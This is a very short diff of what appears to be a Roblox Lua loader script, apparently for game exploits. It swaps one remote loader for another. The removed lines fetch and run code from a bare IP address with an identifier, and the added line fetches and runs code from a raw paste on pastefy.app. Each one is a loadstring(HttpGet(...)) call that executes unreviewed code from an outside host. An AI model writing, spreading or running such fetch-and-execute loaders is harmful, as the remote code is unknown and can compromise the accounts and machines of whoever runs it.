@@ -1,3 +1,1 @@
-_G.LoadingScreen = true
-ID="b4435944-4fdb-4d46-8cf2-f033d5e94306";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://pastefy.app/7OnDbIKE/raw"))()
